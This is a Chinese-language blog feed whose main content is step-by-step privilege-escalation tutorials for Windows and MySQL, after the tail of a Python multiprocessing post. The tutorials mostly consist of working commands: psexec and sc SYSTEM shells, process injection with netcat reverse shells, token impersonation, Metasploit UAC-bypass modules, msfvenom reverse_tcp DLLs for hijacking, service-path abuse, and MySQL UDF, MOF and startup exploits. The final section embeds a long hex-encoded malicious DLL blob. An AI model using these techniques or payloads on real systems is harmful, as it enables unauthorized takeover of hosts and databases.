class="subst">&#123;name&#125;</span>提供的食物&#x27;</span>)</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = Process(target=生产者,args=(q,))</span><br><span class="line">    t2 = Process(target=消费者,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><p>此处，与<strong>多进程</strong>区别在于，需要将 <code>q = Queue()</code>当作参数发送给进程，且函数需要接收该参数才可以。运行截图如下</p><p><img src="/posts/524a945e/202304172059135.png" alt="image-20230417205950989"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权</title>
      <link href="/posts/bfcd90eb/"/>
      <url>/posts/bfcd90eb/</url>
      
        <content type="html"><![CDATA[<h2 id="AT-amp-SC-amp-PS命令"><a href="#AT-amp-SC-amp-PS命令" class="headerlink" title="AT&amp;SC&amp;PS命令"></a>AT&amp;SC&amp;PS命令</h2><h3 id="1、AT命令提权的原理"><a href="#1、AT命令提权的原理" class="headerlink" title="1、AT命令提权的原理"></a>1、AT命令提权的原理</h3><blockquote><p>at命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用system权限。<br>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除.<br>当我们拿到低权限的用户，通过连接上服务器后，可以通过at命令来进行本地提权。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 20:18 /interactive cmd # 在20:18分生成一个交互式的System权限的cmd</span><br></pre></td></tr></table></figure><p><img src="/posts/bfcd90eb/1677827441487-9fd1a718-7ebd-4341-be54-12b4c687f2d8.png" alt="image.png"></p><h3 id="2、SC命令提权"><a href="#2、SC命令提权" class="headerlink" title="2、SC命令提权"></a>2、SC命令提权</h3><blockquote><p>sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。适用版本：windows 7、8、2003、2008、2012、2016（win2k3 ok 其他未测 基本失败）</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建一个名叫syscmd的新的交互式的cmd执行服务</span></span><br><span class="line"><span class="built_in">sc</span> Create syscmd binPath= <span class="string">&quot;cmd /K start&quot;</span> <span class="built_in">type</span>= own <span class="built_in">type</span>= interact</span><br></pre></td></tr></table></figure><p>运行服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> syscmd</span><br></pre></td></tr></table></figure><p><img src="/posts/bfcd90eb/1677827779582-e4c0316d-1b4a-42a5-984e-5389cfe8b48a.png" alt="image.png"></p><h3 id="3、PS命令提权"><a href="#3、PS命令提权" class="headerlink" title="3、PS命令提权"></a>3、PS命令提权</h3><p>适用版本：Win2012 and Win2008 &amp; Win2016 其他未测 基本可以<br><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula -s -i -d cmd #调用运行cmd</span><br></pre></td></tr></table></figure><p><img src="/posts/bfcd90eb/1677827882731-0e75c33f-cd90-40ab-bcd9-9da2723b6748.png" alt="image.png"></p><h2 id="进程迁移注入"><a href="#进程迁移注入" class="headerlink" title="进程迁移注入"></a>进程迁移注入</h2><p>相当于开了一个后门，注入到其他用户进程下！</p><h3 id="1、利用pinjector注入"><a href="#1、利用pinjector注入" class="headerlink" title="1、利用pinjector注入"></a>1、利用pinjector注入</h3><p>pinjector下载链接：<a href="https://www.tarasco.org/security/Process_Injector/index.html">Tarasco Security: Process Injector</a></p><p>windows2003可用其他不行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pinjector.exe <span class="literal">-l</span>   <span class="comment">#获取当前进程信息</span></span><br><span class="line">pinjector.exe <span class="literal">-p</span> <span class="number">420</span> cmd <span class="number">3333</span>  <span class="comment">#将pid为420进程权限反弹到3333端口</span></span><br><span class="line">nc <span class="number">192.168</span>.<span class="number">46.149</span> <span class="number">3333</span><span class="comment">#kali监听3333端口</span></span><br></pre></td></tr></table></figure><h3 id="2、MSF进程注入"><a href="#2、MSF进程注入" class="headerlink" title="2、MSF进程注入"></a>2、MSF进程注入</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">msf利用，先上线后操作</span></span><br><span class="line">ps #查看进程</span><br><span class="line">migrate PID #迁移对应PID</span><br></pre></td></tr></table></figure><h2 id="令牌窃取-amp-烂土豆"><a href="#令牌窃取-amp-烂土豆" class="headerlink" title="令牌窃取&amp;烂土豆"></a>令牌窃取&amp;烂土豆</h2><blockquote><p>令牌窃取<br>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。<br>当一个攻击者需要域管理员的操作权限时候，需通过假冒域管理员的令牌进行攻击。</p></blockquote><h3 id="1、本地权限"><a href="#1、本地权限" class="headerlink" title="1、本地权限"></a><strong>1、本地权限</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">msf利用，先上线后操作</span></span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure><h3 id="2、Web权限"><a href="#2、Web权限" class="headerlink" title="2、Web权限"></a><strong>2、Web权限</strong></h3><p>web权限用常规的令牌窃取方式不能成功，但是可以利用烂土豆</p><p>烂土豆下载连接：<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">windows-kernel-exploits&#x2F;MS16-075 at master · SecWiki&#x2F;windows-kernel-exploits (github.com)</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">execute -cH -f ./potato.exe #配合烂土豆</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure><h2 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h2><blockquote><p>为了远程执行目标的exe或者bat可执行文件绕过此安全机制，以此叫BypassUAC<br>绕过项目：MSF内置，Powershell渗透框架，<strong>UACME项目(推荐)</strong><br>未开启UAC时,MSF默认getsystem可直接提权</p></blockquote><h3 id="1、MSF利用"><a href="#1、MSF利用" class="headerlink" title="1、MSF利用"></a>1、MSF利用</h3><p><strong>Win7</strong></p><p>win7开启unc情况下提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac    </span><br><span class="line">set session 1#设置获得的会话</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行结束返回一个会话</span></span><br><span class="line">getsystem</span><br></pre></td></tr></table></figure><p><img src="/posts/bfcd90eb/1680352623174-72db78ad-706d-4db6-bcbb-7ede9f53f14a.png" alt="img"></p><p><strong>Win10</strong></p><p>msf中bypassuac在win10下并不能成功可以利用如下模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ask</span><br><span class="line">use exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">use exploit/windows/local/bypassuac_silentcleanup</span><br></pre></td></tr></table></figure><p>以第一个为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先上线msf</span></span><br><span class="line">use exploit/windows/local/ask</span><br><span class="line">set session 1   #设置上线会话</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在利用时需要管理员在机器上点击允许才可以返回会话(其他模块测试并不需要)</p><p><img src="/posts/bfcd90eb/image-20230401205546311.png" alt="image-20230401205546311"></p><p><img src="/posts/bfcd90eb/image-20230401205646390.png" alt="image-20230401205646390"></p><p>其他模块使用方法相同，提权是否成功与环境有关，可以多尝试几个模块</p><h3 id="2、UACME项目"><a href="#2、UACME项目" class="headerlink" title="2、UACME项目"></a>2、UACME项目</h3><p><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a><br>需要自己编译为exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Akagi64.exe &lt;想要使用的编号&gt;</span></span><br><span class="line">Akagi64.exe 41</span><br></pre></td></tr></table></figure><p><img src="/posts/bfcd90eb/image-20230402151413800.png" alt="image-20230402151413800"></p><p>成功后会弹出一个cmd会话，该会话权限为system</p><p>但是在真实情况下并不能接受到此会话，可以利用调用执行来获取会话</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Akagi64.exe &lt;想要使用的编号&gt; &lt;调用的后门程序&gt;</span></span><br><span class="line">Akagi64.exe 41 msf.exe</span><br></pre></td></tr></table></figure><p><img src="/posts/bfcd90eb/image-20230402151707623.png" alt="image-20230402151707623"></p><p>如果失败可以尝试切换编号尝试</p><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>原理：Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过在应用程序要查找的位置放置恶意 DLL 来提权。通常，Windows 应用程序有其预定义好的搜索 DLL 的路径。</p><p>通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、应用程序加载的目录</span><br><span class="line">2、C:\Windows\System32</span><br><span class="line">3、C:\Windows\System</span><br><span class="line">4、C:\Windows</span><br><span class="line">5、当前工作目录Current Working Directory，CWD</span><br><span class="line">6、在PATH环境变量的目录（先系统后用户）</span><br></pre></td></tr></table></figure><h3 id="1、分析dll"><a href="#1、分析dll" class="headerlink" title="1、分析dll"></a>1、分析dll</h3><p>检测： ChkDllHijack 火绒剑<br>项目：<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a><br>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p><p>分析程序:libeay32.exe</p><p><img src="/posts/bfcd90eb/image-20230402153558439.png" alt="image-20230402153558439"></p><p>可以看到该程序调用如下dll文件</p><h3 id="2、替换dll"><a href="#2、替换dll" class="headerlink" title="2、替换dll"></a>2、替换dll</h3><p>接下来可以利用msf生成一个dll后门文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.20  lport=6666 -f dll &gt;libeay32.dll</span><br></pre></td></tr></table></figure><p>将原有的dll文件替换为我们生成的后门dll文件，然后再运行该程序</p><p><img src="/posts/bfcd90eb/image-20230402154142193.png" alt="image-20230402154142193"></p><h2 id="不带引号的服务路径"><a href="#不带引号的服务路径" class="headerlink" title="不带引号的服务路径"></a>不带引号的服务路径</h2><blockquote><p>不带引号 有空格的目录就会认为是文件加参数<br>带引号 有空格的目录还是一个整体<br>原理：当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行路径，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的路径未包含在引号中，则操作系统将会执行找到的空格分隔的路径的第一个实例。</p></blockquote><h3 id="1、检测"><a href="#1、检测" class="headerlink" title="1、检测"></a>1、检测</h3><p>当找到不带引号的服务路径后还该路径中存在空格</p><p>检测脚本: <a href="https://github.com/411Hall/JAWS">https://github.com/411Hall/JAWS</a></p><p>检测命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/bfcd90eb/image-20230402160048605.png" alt="image-20230402160048605"></p><p>检测结果中只有一个符合条件</p><h3 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h3><p>路径为：c:\program files (x86)\grasssoft\macro expert\MacroService.exe</p><p>这个时候我们制作一个木马名字为：program.exe传到c:\下  那么该服务引用的路径实际调用文件就变成了c:\program.exe</p><p>上传完成后重启服务</p><p><img src="/posts/bfcd90eb/image-20230402160448685.png" alt="image-20230402160448685"></p><h2 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h2><p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。<br>过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p><h3 id="1、检测-1"><a href="#1、检测-1" class="headerlink" title="1、检测"></a>1、检测</h3><p><strong>检测脚本：</strong><br>accesschk：<br><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;administrators&quot; *</span><br></pre></td></tr></table></figure><p><img src="/posts/bfcd90eb/image-20230402162004786.png" alt="image-20230402162004786"></p><p>找到这种service_all_access的,就是可能利用的地方</p><p>PowerUp(PowerSploit)：<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br><a href="https://blog.csdn.net/bring_coco/article/details/113110165">https://blog.csdn.net/bring_coco/article/details/113110165</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerUp.ps1</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure><h3 id="2、利用-1"><a href="#2、利用-1" class="headerlink" title="2、利用"></a>2、利用</h3><p>找到一个test服务有权限可以修改路径<br>将后门文件上传到c:\ 目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc config &quot;test&quot; binpath=&quot;C:\shell.exe&quot;     #将服务路径设置为后门地址</span><br><span class="line">sc start test#重启服务</span><br></pre></td></tr></table></figure><p><img src="/posts/bfcd90eb/image-20230402162716503.png" alt="image-20230402162716503"></p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库提权</title>
      <link href="/posts/29c025a9/"/>
      <url>/posts/29c025a9/</url>
      
        <content type="html"><![CDATA[<p>提权条件</p><ul><li>有数据库的最高权限用户的密码</li><li>secure-file-priv没进行目录限制（如果值为null则不能导出，可在my.ini中修改为secure_file_priv&#x3D;’’）</li></ul><p>数据库账号密码获取方式</p><ul><li>网站存在高权限SQL注入点</li><li>数据库的存储文件或备份文件（如：MySQL&#x2F;data&#x2F;cysql&#x2F;user.MYD 中保存了mysql密码）</li><li>网站应用源码中的数据库配置文件</li><li>采用工具或脚本爆破(需解决外联问题)</li></ul><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>前提：已经获取到webshell以及数据库账号密码<br><img src="/posts/29c025a9/1677673937396-3a09bcbb-7c6b-418e-8837-04bd309252bd.png" alt="image.png"></p><h3 id="1、UDF"><a href="#1、UDF" class="headerlink" title="1、UDF"></a>1、UDF</h3><blockquote><p>获取密码-开启外联-高版本创建目录-MSF导出dll-Webshell执行后续<br>按照版本不同可分为两种<br>1.mysql&lt;5.2 导出目录c:&#x2F;windows或system32<br>2.mysql&#x3D;&gt;5.2 导出安装目录&#x2F;lib&#x2F;plugin&#x2F;</p></blockquote><p>先确认版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> version()</span><br></pre></td></tr></table></figure><p><img src="/posts/29c025a9/1677674135818-b33281b9-b088-4a96-9d04-eb209b22edd7.png" alt="image.png"><br>大于5.2 导出目录选择 &#x2F;lib&#x2F;plugin&#x2F;<br>查看安装目录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@basedir</span></span><br></pre></td></tr></table></figure><p><img src="/posts/29c025a9/1677674121009-583e4fa0-15e3-49f2-841a-de8efe1b7357.png" alt="image.png"><br>如果安装目录下面没有&#x2F;lib&#x2F;plugin目录可自行创建<br>开启外联(root默认禁止外联)</p><blockquote><p>webshell连接数据库是在服务器连接不属于外联<br>navicat连接属于外链</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;帐号&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;密码&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;</span><br></pre></td></tr></table></figure><p>使用MSF中的exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload 模块可以进行UDF提权<br>MSF会将dll文件写入lib\plugin\目录下(前提是该目录存在，需手工创建),该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建 sys_eval() 函数，来执行有回显的命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">前提先开外链</span></span><br><span class="line">use exploit/multi/mysql/mysql_udf_payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set password root</span><br><span class="line">set rhosts 192.168.52.129</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/29c025a9/1677676364379-90c94606-24f1-4b52-9609-0f33fd67bf13.png" alt="image.png"><br>可以看到&#x2F;lib&#x2F;plugin&#x2F;中已经生成了dll文件<br>接下来的操作利用Navicat</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func where name = &quot;sys_exec&quot;;# 查看</span><br><span class="line">create function sys_eval returns string soname &quot;EhRpYxvm.dll&quot;;# 创建函数绑定刚才生成的dll</span><br><span class="line">select sys_eval(&quot;whoami&quot;);# 调用函数进行命令执行</span><br></pre></td></tr></table></figure><p><img src="/posts/29c025a9/1677676855359-c2f4b93e-e0af-45d2-8d69-71a48f2ba67f.png" alt="image.png"></p><h3 id="2、MOF"><a href="#2、MOF" class="headerlink" title="2、MOF"></a>2、MOF</h3><p>Win2008后权限控制导致无效-MSF演示<br>MSF利用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit<span class="operator">/</span>windows<span class="operator">/</span>mysql<span class="operator">/</span>mysql_mof</span><br><span class="line"><span class="keyword">set</span> payload windows<span class="operator">/</span>meterpreter<span class="operator">/</span>reverse_tcp</span><br><span class="line"><span class="keyword">set</span> rhosts <span class="number">192.168</span><span class="number">.127</span><span class="number">.132</span>#mysql地址</span><br><span class="line"><span class="keyword">set</span> username root#mysql用户</span><br><span class="line"><span class="keyword">set</span> password root#mysql密码</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="3、启动项"><a href="#3、启动项" class="headerlink" title="3、启动项"></a>3、启动项</h3><blockquote><p>利用MSF（前提先开外链）<br>就是借助mysql 将木马写入到启动项 需要配合服务器重启</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line">set rhosts 192.168.52.129</span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line">set AllowNoCleanup true</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/29c025a9/1677677523754-df0cb066-efa1-4482-8b35-59223dcedeff.png" alt="image.png"><br><img src="/posts/29c025a9/1677677608969-074fcfc5-d3dc-46a1-8bfd-c55195a6ced9.png" alt="image.png"><br>已经加入到启动项，服务器重启后即可上线<br><img src="/posts/29c025a9/1677678296830-9f807b9d-460b-494d-8056-3dc3e086a2b3.png" alt="image.png"></p><h3 id="4、反弹Shell"><a href="#4、反弹Shell" class="headerlink" title="4、反弹Shell"></a>4、反弹Shell</h3><blockquote><p>参考 <a href="https://blog.csdn.net/weixin_43801718/article/details/105493042">https://blog.csdn.net/weixin_43801718&#x2F;article&#x2F;details&#x2F;105493042</a></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span>concat(<span class="string">&#x27;&#x27;</span>,<span class="number">0x4d5a4b45524e454c33322e444c4c00004c6f61644c696272617279410000000047657450726f63416464726573730000557061636b42794477696e6740000000504500004c010200000000000000000000000000e0000e210b0100360090000000100100000000003d9502000010000000a00000000000100010000000020000040000000000000004000000000000000010030000020000000000000200000000001000001000000000100000100000000000001000000009980200dd020000f19702001400000000c001009000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e557061636b000000b00100001000000000000000000000000000000000000000000000600000e02e727372630000000050010000c00100e6da000000020000000000000000000000000000600000e088010010e89a02101b0000000e000000001000106b970210b7970210ba970210c8970210a3970210fc0f0010de960210e0960210809502101dba0110ed970210ffaf0110d2960210000400007c070000c40b0000b30200006604000090c0011000000000ffffffff01000000010000000100000001000000000000000000000000000000010000008800008018000080000000000000000000000000000002006500000038000080660000006000008000000000000000000000000000000100040800005000000090000100004400000000000000000000000000000000000000000000000001000408000078000000904401005c3c000000000000000000000300420049004e00459398edb4853493541907b2de1fcbd640cd0773df2017d5f39748433f6d90c556f2b1c13f1be3bcb417f756a33186e453b17faf31e8157911b03da9aaf41f2277afffec07571bfae8214b0ff18af2f7c0ad2d95a1ff0f487658e587923bc1ce9d2c2698c74b940c5842bf55c7da2026563c174c45c6c5e08e95b030390ef0886bd124043aed5b1631b138955065fa05fbfcc1c0b81636c51c7f18bccc846ac8305f5c5134fd92a3e9cb2bb5d99ee1e21a6f5d2929597c59b61e8925c1675138746f1f549d1b8a0c35b7dab30b46a401737162d316fb50723e8a98ca5d6d298259015fe6e1c0a402790e15a965807b488c73e6915ffd6e57d333c0d86ef3a562e0bf0bccbe4bc7ccb560bc2df75d593904f638eae6a964c33f4e123a1d3c213b184373bf34c66ed68b368316156e32f6fa63e02add3b03893f73af8abd1099c48c1d0c886314167008ef255d5c2c3539fb781d6d39aa432d654c702f15df0a339530889adfefde4b9df29d2e8fa7e4317fda1b0588a22265eb53c317bc6ea94fa1981968d5a60921ff60f9e9559123aeaa8d1e91e38fb1a2fb1d2075454e8ef226538ed8307db2c99cd396b5c6da829569c3875f317a4bff429b0528d204af4284fc05207901d48e52b386e5d44c69a2e8e3086f137f1d0694ecd619ecc97af83a97d5a0598701b386bd704864c72b3858824fc94082da933d5fadb23ef3dee6528cd4cb2eefe2f2b03d17857940d70222d541b2523f4e7d5b8ee46caba89830d664defb08f798e83818cde2701b8c5d37fc6c5c045ae468efca8b8d5b62b60811c21dae6b86deffa3824e7581435c0bc67555c2d498047554b52d0bfc909911e94ce5d6d3a72659b0ee25f2b40be7d239115256d8c2687afc7e075a2557f974d9130d76e09955235ed4afbc03891d8cc489c8a6f0aa00cfa41ceffd29df70edd17679477c4edd29023c807a55e8dfe614fefe44ad759cfca628d9da21b68e2d6a7ab33d62b175fb858c94158923278f256e96eff885e3eafa12b09ecabfa54d523a3c33270510fd821a0f56e24d3bfaa815a6bd4e2eba52e52a940037728e2cbcd8278fe714384a4bfc887797b071bb440b010a9d0db60cbacee05907b7b08e20dba7f45ffd21265bc47086f8275c1c5071afaeb7ce0336e0a5facf0a7923597c7f4ee7b54512b38608c8ce06acd05cfcdd68ec58f288889ef615623409bc88dd3b09b8be22fcc199755426b4b0704ec21ae1a3e7efe21cf6952456f3743d8d76e1d02e7f7815ea30feb20f279fa9cf827d7618c1c182be35a5ab2eb9f611057b493eff526a75513347a1dce859f1d8d5cc9e842f55f82211b2fa26ce53c5f133afd31531c50324a5429b74fab0746eed031acb0d02344e1b495bca244ae6eba4dcd3da28419a064c22e895880fd2485c3e6861b6e06a4e43959b9d0633774ea85692b12408f6867903f8b9bf790973680440d4822238690617af451d0eebf942d4c98637e9ba092b38dcdc608f330722cc255a4feb5d2a3cb268518ebf43231d9630ac95ae22ff0b8640335febcaf6a3066be83f03673636639e7cb025963d4071886ef072bf9f6f5ad0e0a407734b77320cb1fc6a6a07d14d36403ac1b849eba998b5f64d59ecfa4e30200d84d236a12b1b11acae3e4d74ca5368657f93b4d80cc5356c5537ffab7d3f792a03912a01d94c03f4f097824586708ecc7cbd1db4b7e24a0f2e45121629b9c2bc92716b790246c4a4159fd9e4958fc13a4a72c1d799078d601f3eba6457ae19a68877841d343175f3b692ec219c3a059931421596335af3121670ef9602fce94de822922d7f1c357f7719b2a63de4a0c9b648297326b5a32082462e6bd83457f5c415a418209b4deecbb66f26383d9244f08e0aee60659808dbd2a4744865f6b6a0950ed88138a0c6496245c84d60caabef5facc467f114dd3b695e39fb076887147be54b8ff924aad0e159f4da839d7b67ea764b3e5906ad36bc3c476584bb38b7f009cedab0e6d89bb9ec76e3228e559b69c763bcbe2804dfbc4c6eba24173214dd72f455eaf170e5afc8b7a1ffac801dcd05a53aaef649f67f1d11cf249cdcf2e33a7d93e872d323a836a78be609996b592f3bb5fd8f6b952fd09d66647dcc055aa681b8af88597d510daae5255d2318b9b5e116b83b06c8a644010d677c683684abd9b677ac444ec7163218e4708336b0d12bbb660fe9bc21e49d2efc76d74e26c71d6c945267fd7d664fe5385abc834f661fe715b0924e9c63f5f6c88cb0ee11b44393a9113f6c17d56bd982a00cd4811653669c3a1b9535260742017659cf380fbf76ae37b92863bc94923f3990658db72c9c64bc29d4c2c03ec0c1c74e3558f66092c1d78d710d52a2c96cc6cad8729d9385016b36c9d231986cb60e8cfeb37aacf1205b9cbad985834c8b4b9d435e17dbc94967b5eb3e32e2a0423744951b1a087d85a822663de7a3f9c2253f7366d02e161b9b3a18fdee2946d741d3f2a5b0d0f3217e54d9cc97c8a62abca1b114240cce3576a7131069751af5a280721df185caace01a618f57cd8dc52e03a85048adb2d6f31d9d136817602ee2c38f694e6cb9eb2e830abf46b8a2f4ecf4fbd190e357d774e1dbe9de09650ea97486d41bb406c36d07dfa66c8347720158494c21ef841d6219aa0d3c8dd1cd33c3734e49ee574928bb0b1b28f86f0eced7c8fc50e93868455d6419ed7bffe464315490de54ab89437cd6f9f2e71fd59e4c5863ec3f83e4760edc9bc51a9c55a4b253c7966eb110259221449c131b3b328630ea1da1d8553d05fe6830902950a48d623396edd5280a1bbb165d1eab1a77f157d1b7870c4411850752bab0b6fb688d268901c2d8e456e3ee0614d1dd30a138f33661268fd83eb720f5953c280949f7760372ddfbcfd9fa54ced88fe574da013246aeea3bd41b72c6dbf603adcc21e5b7de44345d2a972ec002761a886b55579b8ff13286f668504c3290d15dbef81b1e96ad946a6466b7128d0ac11fb7fad4fe60b6c70e687c5665827a1ded9326f329c3dacb0dbd25ac1adcdc3eccab7d97db8c55b96afd5504bde724ca1489ef6108b25da9555f78111a6a04c30ae62961ade9cb8c02be27ba9984c0104ab80376719a08047d821b0bf60e1a29a6d7d377760b053ae91bf805